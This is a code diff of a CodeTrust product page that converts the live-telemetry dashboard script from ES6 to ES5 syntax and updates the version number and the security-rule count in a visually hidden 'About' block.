+        // ============================================================
+        // GATEWAY ANIMATION — Card 2 animated lines
+        // ============================================================
+        var gatewayObserver = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+                if (entry.isIntersecting) {
+                    var lines = entry.target.querySelectorAll('.gateway-line');
+                    lines.forEach(function(line) {
+                        var delay = parseInt(line.dataset.delay) || 0;
+                        setTimeout(function() {
+                            line.classList.add('show');
+                        }, delay);
+                    });
+                    gatewayObserver.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.3 });
+
+        var gatewayDemo = document.getElementById('gateway-demo');
+        if (gatewayDemo) {
+            gatewayObserver.observe(gatewayDemo);
+        }
+
+        // ============================================================
+        // LIVE TELEMETRY — exact copy from production site
+        // ============================================================
+        var API_URL = 'https://api.codetrust.ai/v1/stats/public';
+        var WS_URL = 'wss://api.codetrust.ai/v1/stats/live';
+        var POLL_REFRESH_MS = 30000;
+
+        var pollTimer = null;
+        var ws = null;
+
+        var IMPACT_ICONS = {
+            destructive_commands: '\uD83D\uDEE1\uFE0F',
+            hallucinations: '\uD83E\uDDE0',
+            secrets_exposure: '\uD83D\uDD11',
+            injection_attacks: '\uD83D\uDC1B',
+            unsafe_config: '\u2699\uFE0F',
+            supply_chain: '\uD83D\uDCE6'
         };
 
         function extractStats(payload) {
-            const s = (payload && payload.stats) ? payload.stats : {};
-            const u = s.usage || {};
-            const i = s.impact || {};
-            const d = s.distribution || {};
-            const pypi = (d.pypi) || {};
-            const mkt = (d.marketplace) || {};
-            const ovsx = (d.open_vsx) || {};
-            const src = u.scans_by_source || {};
+            var s = (payload && payload.stats) ? payload.stats : {};
+            var u = s.usage || {};
+            var i = s.impact || {};
+            var d = s.distribution || {};
+            var pypi = (d.pypi) || {};
+            var mkt = (d.marketplace) || {};
+            var ovsx = (d.open_vsx) || {};
+            var src = u.scans_by_source || {};
 
-            const gateway_blocked = i.gateway_commands_blocked || payload.destructive_commands_blocked || 0;
-            const hallucinations_caught = i.hallucinations_caught || payload.hallucinated_packages_prevented || 0;
-            const blocks_found = (s.usage && s.usage.findings_by_severity && s.usage.findings_by_severity.BLOCK) || 0;
-            const pypi_total = pypi.downloads_total || 0;
-            const mkt_dl = mkt.downloads || payload.marketplace_downloads || 0;
-            const ovsx_dl = ovsx.downloads || payload.openvsx_downloads || 0;
+            var gateway_blocked = i.gateway_commands_blocked || payload.destructive_commands_blocked || 0;
+            var hallucinations_caught = i.hallucinations_caught || payload.hallucinated_packages_prevented || 0;
+            var blocks_found = (s.usage && s.usage.findings_by_severity && s.usage.findings_by_severity.BLOCK) || 0;
+            var pypi_total = pypi.downloads_total || 0;
+            var mkt_dl = mkt.downloads || payload.marketplace_downloads || 0;
+            var ovsx_dl = ovsx.downloads || payload.openvsx_downloads || 0;
 
             return {
                 total_scans: u.total_scans || payload.total_scans || 0,
@@ -1287,73 +795,77 @@
                 src_github_action: src.github_action || 0,
                 src_cloud_api: src.cloud_api || 0,
 
-                impact_categories: i.categories || {},
+                impact_categories: i.categories || {}
             };
         }
 
         function formatRelativeTime(iso) {
             if (!iso) return 'active category';
-            const date = new Date(iso);
+            var date = new Date(iso);
             if (Number.isNaN(date.getTime())) return 'active category';
-            const diffMs = Date.now() - date.getTime();
-            const diffMin = Math.max(0, Math.floor(diffMs / 60000));
+            var diffMs = Date.now() - date.getTime();
+            var diffMin = Math.max(0, Math.floor(diffMs / 60000));
             if (diffMin < 1) return 'updated just now';
-            if (diffMin < 60) return `last seen ${diffMin} minute${diffMin === 1 ? '' : 's'} ago`;
-            const diffHr = Math.floor(diffMin / 60);
-            if (diffHr < 24) return `last seen ${diffHr} hour${diffHr === 1 ? '' : 's'} ago`;
-            const diffDay = Math.floor(diffHr / 24);
-            return `last seen ${diffDay} day${diffDay === 1 ? '' : 's'} ago`;
+            if (diffMin < 60) return 'last seen ' + diffMin + ' minute' + (diffMin === 1 ? '' : 's') + ' ago';
+            var diffHr = Math.floor(diffMin / 60);
+            if (diffHr < 24) return 'last seen ' + diffHr + ' hour' + (diffHr === 1 ? '' : 's') + ' ago';
+            var diffDay = Math.floor(diffHr / 24);
+            return 'last seen ' + diffDay + ' day' + (diffDay === 1 ? '' : 's') + ' ago';
         }
 
         function renderImpactSection(m) {
-            const grid = document.getElementById('impact-grid');
+            var grid = document.getElementById('impact-grid');
             if (!grid) return;
 
-            const categories = Object.entries(m.impact_categories || {})
-                .map(([key, value]) => ({
-                    key,
-                    label: value && value.label ? value.label : key,
-                    count: Number((value && value.count) || 0),
-                    last_seen: value ? value.last_seen : null,
-                }))
-                .filter((entry) => entry.key !== 'other')
-                .sort((a, b) => b.count - a.count);
+            var categories = Object.entries(m.impact_categories || {})
+                .map(function(pair) {
+                    var key = pair[0];
+                    var value = pair[1];
+                    return {
+                        key: key,
+                        label: value && value.label ? value.label : key,
+                        count: Number((value && value.count) || 0),
+                        last_seen: value ? value.last_seen : null
+                    };
+                })
+                .filter(function(entry) { return entry.key !== 'other'; })
+                .sort(function(a, b) { return b.count - a.count; });
 
-            grid.innerHTML = categories.map((entry) => `
-                <article class="impact-card" data-category="${entry.key}">
-                    <div class="impact-card-head">
-                        <span class="impact-icon">${IMPACT_ICONS[entry.key] || '🧩'}</span>
-                        <span class="impact-label">${entry.label}</span>
-                    </div>
-                    <div class="impact-count">${entry.count.toLocaleString()}</div>
-                    <div class="impact-last-seen">${formatRelativeTime(entry.last_seen)}</div>
-                </article>
-            `).join('');
+            grid.innerHTML = categories.map(function(entry) {
+                return '<article class="impact-card" data-category="' + entry.key + '">' +
+                    '<div class="impact-card-head">' +
+                    '<span class="impact-icon">' + (IMPACT_ICONS[entry.key] || '\uD83E\uDDE9') + '</span>' +
+                    '<span class="impact-label">' + entry.label + '</span>' +
+                    '</div>' +
+                    '<div class="impact-count">' + entry.count.toLocaleString() + '</div>' +
+                    '<div class="impact-last-seen">' + formatRelativeTime(entry.last_seen) + '</div>' +
+                    '</article>';
+            }).join('');
         }
 
         function animateValue(el, from, to, duration) {
             if (from === to) return;
-            const start = performance.now();
-            const step = (now) => {
-                const progress = Math.min((now - start) / duration, 1);
-                const ease = 1 - Math.pow(1 - progress, 3);
+            var start = performance.now();
+            var step = function(now) {
+                var progress = Math.min((now - start) / duration, 1);
+                var ease = 1 - Math.pow(1 - progress, 3);
                 el.textContent = Math.floor(from + (to - from) * ease).toLocaleString();
                 if (progress < 1) requestAnimationFrame(step);
             };
             requestAnimationFrame(step);
         }
 
-        let firstLoad = true;
+        var firstLoad = true;
 
         function updateDashboard(payload) {
-            const m = extractStats(payload);
-            const dur = firstLoad ? 1800 : 600;
-            document.querySelectorAll('[data-key]').forEach(el => {
-                const key = el.dataset.key;
-                const val = m[key];
+            var m = extractStats(payload);
+            var dur = firstLoad ? 1800 : 600;
+            document.querySelectorAll('[data-key]').forEach(function(el) {
+                var key = el.dataset.key;
+                var val = m[key];
                 if (val === undefined) return;
-                const oldVal = parseInt(el.dataset.count) || 0;
-                const newVal = Number(val || 0);
+                var oldVal = parseInt(el.dataset.count) || 0;
+                var newVal = Number(val || 0);
                 el.dataset.count = newVal;
                 if (newVal !== oldVal) {
                     animateValue(el, oldVal, newVal, dur);
@@ -1363,13 +875,13 @@
 
             renderImpactSection(m);
 
-            const ts = payload && payload.stats && payload.stats.updated_at;
-            const tsEl = document.getElementById('live-updated-at');
+            var ts = payload && payload.stats && payload.stats.updated_at;
+            var tsEl = document.getElementById('live-updated-at');
             if (ts && tsEl) {
                 try {
-                    const d = new Date(ts);
+                    var d = new Date(ts);
                     tsEl.textContent = 'updated ' + d.toLocaleTimeString();
-                } catch (_) {
+                } catch (e) {
                     tsEl.textContent = 'live';
                 }
             }
@@ -1377,11 +889,11 @@
 
         async function fetchStatsOnce() {
             try {
-                const res = await fetch(API_URL, { cache: 'no-store' });
+                var res = await fetch(API_URL, { cache: 'no-store' });
                 if (!res.ok) throw new Error(res.status);
-                const data = await res.json();
+                var data = await res.json();
                 updateDashboard(data);
-            } catch (_) {
+            } catch (e) {
                 // keep previous values
             }
         }
@@ -1401,27 +913,27 @@
             stopPolling();
             try {
                 ws = new WebSocket(WS_URL);
-            } catch (_) {
+            } catch (e) {
                 startPolling();
                 return;
             }
-            ws.onmessage = (event) => {
+            ws.onmessage = function(event) {
                 try {
-                    const msg = JSON.parse(event.data);
+                    var msg = JSON.parse(event.data);
                     if (msg && msg.stats) {
                         updateDashboard({ stats: msg.stats });
                     }
-                } catch (_) {
+                } catch (e) {
                     // ignore
                 }
             };
-            ws.onclose = () => {
+            ws.onclose = function() {
                 ws = null;
                 startPolling();
-                setTimeout(connectWebSocket, 30_000);
+                setTimeout(connectWebSocket, 30000);
             };
-            ws.onerror = () => {
-                try { ws.close(); } catch (_) { }
+            ws.onerror = function() {
+                try { ws.close(); } catch (e) { }
             };
         }
 
@@ -1434,7 +946,7 @@
         if (typeof navigator !== 'undefined') {
             navigator.modelContext = {
                 name: 'CodeTrust',
-                version: '2.9.0',
+                version: '3.0.0',
                 description: 'AI governance enforcement platform — scan code, verify imports, detect hallucinated packages, enforce trust scores',
                 endpoint: 'https://api.codetrust.ai/v1',
                 transport: 'http',
@@ -1498,7 +1010,7 @@
         style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap">
         <h2>About CodeTrust</h2>
         <p>CodeTrust (codetrust.ai) is the AI governance enforcement platform that prevents unsafe, hallucinated, and
-            destructive AI-generated code from reaching production. Built by Said Borna, CodeTrust enforces 286 security
+            destructive AI-generated code from reaching production. Built by Said Borna, CodeTrust enforces 484 security
             rules across 10 inspection layers in real time.</p>
 
         <h3>AI Governance Gateway</h3>
@@ -1513,8 +1025,7 @@
             rules catch fabricated imports (ai_utils, ml_helpers), misspelled packages (requets, sklear, tenserflow),
             invented API endpoints, placeholder URLs, fake API keys, phantom file references, and hallucinated CLI
             flags. Live verification checks every import against PyPI, npm, crates.io, Go proxy, Maven, NuGet, RubyGems,
-            and Packagist — packages not found
-            are blocked immediately.</p>
+            and Packagist — packages not found are blocked immediately.</p>
 
         <h3>Trust Score and Drift Tracking</h3>
         <p>Quantified code safety score from 0 to 100 with per-category breakdown: anti-hallucination, anti-assumption,
